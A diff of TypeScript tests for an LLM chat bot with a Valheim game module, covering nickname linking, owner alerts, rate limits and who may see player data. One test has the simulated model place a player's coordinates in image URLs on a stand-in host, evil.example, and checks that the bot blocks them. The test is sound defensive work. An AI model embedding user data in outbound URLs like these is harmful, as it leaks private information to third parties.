@@ -167,6 +167,41 @@ test("картинки: attach_image модели и ![](…) из текста 
   assert.deepEqual(img.attachments![0]!.metadata, { width: 64, height: 48, mime: "image/png", originalName: "pic.png", size: img.attachments![0]!.size, objectKey: "up1.eblusha" });
 });
 
+test("картинки после данных модуля — только с вики (данные не увести в адресе картинки)", async () => {
+  const mod: BotModule = {
+    name: "vh",
+    tools: [
+      {
+        name: "valheim_where",
+        description: "где игрок",
+        access: "anyone",
+        inputSchema: { type: "object", properties: {}, required: [], additionalProperties: false },
+        run: async () => "РомаH: x -744, z -325",
+      },
+    ],
+  };
+  const h = await harness({ modules: [mod] });
+  h.llm.reply = async (req) => {
+    assert.equal((await req.tools.run("attach_image", { url: "https://evil.example/ok-before.png" })).isError, false, "до данных модуля — любой https");
+    await req.tools.run("valheim_where", {});
+    const bad = await req.tools.run("attach_image", { url: "https://evil.example/x.png?d=-744,-325" });
+    assert.equal(bad.isError, true);
+    assert.match(bad.content, /только с вики/);
+    assert.equal((await req.tools.run("attach_image", { url: "https://static.wikia.nocookie.net/valheim/images/a/ab/Troll.png/revision/latest?cb=1" })).isError, false);
+    return { text: "Вот." };
+  };
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, где Рома и как выглядит тролль?" }));
+  assert.equal(h.images.length, 2, "приложены: до данных модуля и с вики");
+
+  // ![](…) в тексте ответа после данных модуля — тоже только вики
+  h.llm.reply = async (req) => {
+    await req.tools.run("valheim_where", {});
+    return { text: "Вот. ![x](https://evil.example/y.png?d=-744) ![w](https://valheim.wiki.gg/images/Troll.png)" };
+  };
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, а ещё раз?" }));
+  assert.equal(h.images.length, 3, "скачана только картинка с вики");
+});
+
 test("команды: встроенная помощь — всем; расход — только владельцу в личке", async () => {
   const h = await harness();
   await h.deliver(msg({ conversationId: GROUP, senderId: ALICE, content: "/eb помощь" }));
@@ -243,15 +278,22 @@ test("подтверждение истекает", async () => {
 test("привязка ника: свободная фраза, похожие буквы, перепривязка, чужой персонаж", async () => {
   const mod: BotModule = { name: "vh", characters: { listKnownCharacters: async () => ["РомаH", "Куралеска", "IiApaCiOxa"] } };
   const h = await harness({ modules: [mod] });
-  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, мой ник в игре Парасюха" }));
+  const lastIn = (c: string) => h.api.sent.filter((s) => s.conversationId === c).at(-1)!.content!;
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, мой ник в игре Парасюха", sender: { id: ALICE, displayName: "Алиса" } }));
   assert.match(h.api.sent[0]!.content!, /^Привязал: ты — \*\*IiApaCiOxa\*\* \(Парасюха\)\.$/);
   assert.deepEqual(h.store.getCharacters(ALICE), ["IiApaCiOxa"]);
+  // самопривязка открывает данные игроков — владельцу уведомление в его личку
+  assert.equal(h.api.sent[1]!.conversationId, DM_OWNER);
+  assert.match(h.api.sent[1]!.content!, /Новая привязка: «Алиса» назвался персонажем \*\*IiApaCiOxa\*\*.*отвяжи персонажа IiApaCiOxa/);
 
   await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, я — куралеска" }));
   assert.deepEqual(h.store.getCharacters(ALICE), ["Куралеска"], "перепривязка заменяет");
+  const notices = h.api.sent.filter((s) => s.conversationId === DM_OWNER).length;
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, я — куралеска" }));
+  assert.equal(h.api.sent.filter((s) => s.conversationId === DM_OWNER).length, notices, "повтор той же привязки — без уведомления");
 
   await h.deliver(msg({ conversationId: GROUP, senderId: BOB, content: "Еблуша, мой ник Куралеска" }));
-  assert.match(h.api.sent[2]!.content!, /уже привязан к другому/);
+  assert.match(lastIn(GROUP), /уже привязан к другому/);
 
   // неизвестный ник → модель выбирает по списку
   h.llm.matchReply = "РомаH";
@@ -264,6 +306,103 @@ test("привязка ника: свободная фраза, похожие �
   await h.deliver(msg({ conversationId: GROUP, senderId: OWNER, content: "Еблуша, мой ник Зюзя" }));
   assert.match(h.api.sent[h.api.sent.length - 1]!.content!, /Не нашёл «Зюзя»/);
   assert.equal(h.llm.calls.length, 0, "привязка — не вопрос модели");
+  // сопоставление моделью — за счёт спрашивающего, а не «системы»
+  const day = new Date().toISOString().slice(0, 10);
+  assert.equal(h.store.userKindCount(BOB, day, "nick_match"), 1);
+  assert.equal(h.store.userKindCount("system:nick", day, "nick_match"), 0);
+});
+
+test("привязка: модель для ников — не больше 6 раз в сутки на человека; сервер игры недоступен — не привязываем", async () => {
+  let down = false;
+  const mod: BotModule = {
+    name: "vh",
+    characters: {
+      listKnownCharacters: async () => {
+        if (down) throw new Error("valheim down");
+        return ["РомаH", "Куралеска"];
+      },
+    },
+  };
+  const h = await harness({ modules: [mod] });
+  for (let i = 0; i < 8; i++) await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: `Еблуша, мой ник в игре Зюзя${i}` }));
+  assert.equal(h.llm.matchCalls.length, 6, "дальше — без модели (детерминированно)");
+  assert.match(h.api.sent.at(-1)!.content!, /Не нашёл «Зюзя7»/);
+
+  down = true;
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, мой ник в игре Куралеска" }));
+  assert.match(h.api.sent.at(-1)!.content!, /не могу сверить ник/);
+  assert.deepEqual(h.store.getCharacters(ALICE), [], "без сверки привязки нет");
+});
+
+test("владелец снимает чужую привязку; не владелец — нет", async () => {
+  const mod: BotModule = { name: "vh", characters: { listKnownCharacters: async () => ["IiApaCiOxa", "Куралеска"] } };
+  const h = await harness({ modules: [mod] });
+  h.store.link(BOB, "IiApaCiOxa", { linkedBy: BOB, verified: true, replaceOwn: true, force: false });
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, отвяжи персонажа Парасюха" }));
+  assert.match(h.api.sent.at(-1)!.content!, /только владелец/);
+  assert.deepEqual(h.store.getCharacters(BOB), ["IiApaCiOxa"]);
+  await h.deliver(msg({ conversationId: DM_OWNER, senderId: OWNER, content: "Еблуша, отвяжи персонажа Парасюха" }));
+  assert.match(h.api.sent.at(-1)!.content!, /Снял привязку: \*\*IiApaCiOxa\*\*/);
+  assert.deepEqual(h.store.getCharacters(BOB), []);
+  await h.deliver(msg({ conversationId: DM_OWNER, senderId: OWNER, content: "Еблуша, отвяжи ник Куралеска" }));
+  assert.match(h.api.sent.at(-1)!.content!, /ни к кому не привязан/);
+  // «отвяжи меня» по-прежнему — своя привязка
+  h.store.link(ALICE, "Куралеска", { linkedBy: ALICE, verified: true, replaceOwn: true, force: false });
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, отвяжи меня" }));
+  assert.deepEqual(h.store.getCharacters(ALICE), []);
+});
+
+test("данные игроков в группе: только если все участники — игроки (или BOT_GROUP_PLAYER_DATA=requester)", async () => {
+  let ran = 0;
+  const mod: BotModule = {
+    name: "vh",
+    characters: { listKnownCharacters: async () => ["IiApaCiOxa", "Куралеска"] },
+    tools: [
+      {
+        name: "valheim_where",
+        description: "где игрок",
+        access: "player",
+        inputSchema: { type: "object", properties: {}, required: [], additionalProperties: false },
+        run: async () => {
+          ran++;
+          return "у портала";
+        },
+      },
+    ],
+  };
+  const results: string[] = [];
+  const ask = async (h: Awaited<ReturnType<typeof harness>>) => {
+    h.llm.reply = async (req) => {
+      results.push((await req.tools.run("valheim_where", {})).content);
+      return { text: "ок" };
+    };
+    await h.deliver(msg({ conversationId: GROUP, senderId: ALICE, content: "Еблуша, где все?" }));
+  };
+
+  const h = await harness({ modules: [mod] });
+  h.store.link(ALICE, "IiApaCiOxa", { linkedBy: ALICE, verified: true, replaceOwn: true, force: false });
+  await ask(h); // Боб в группе не привязан
+  assert.equal(ran, 0);
+  assert.match(results.at(-1)!, /есть люди, не привязанные/);
+
+  h.store.link(BOB, "Куралеска", { linkedBy: BOB, verified: true, replaceOwn: true, force: false });
+  await ask(h); // теперь все игроки (владелец — игрок всегда)
+  assert.equal(ran, 1);
+  assert.equal(results.at(-1), "у портала");
+
+  // в личке игроку — всегда
+  h.store.unlinkUser(BOB);
+  h.llm.reply = async (req) => {
+    results.push((await req.tools.run("valheim_where", {})).content);
+    return { text: "ок" };
+  };
+  await h.deliver(msg({ conversationId: DM_ALICE, senderId: ALICE, content: "Еблуша, где все?" }));
+  assert.equal(ran, 2);
+
+  const h2 = await harness({ modules: [mod], cfg: { groupPlayerData: "requester" } });
+  h2.store.link(ALICE, "IiApaCiOxa", { linkedBy: ALICE, verified: true, replaceOwn: true, force: false });
+  await ask(h2);
+  assert.equal(ran, 3, "requester: достаточно, что спрашивает игрок");
 });
 
 test("владелец привязывает другого ответом на его сообщение; не владелец — нет", async () => {
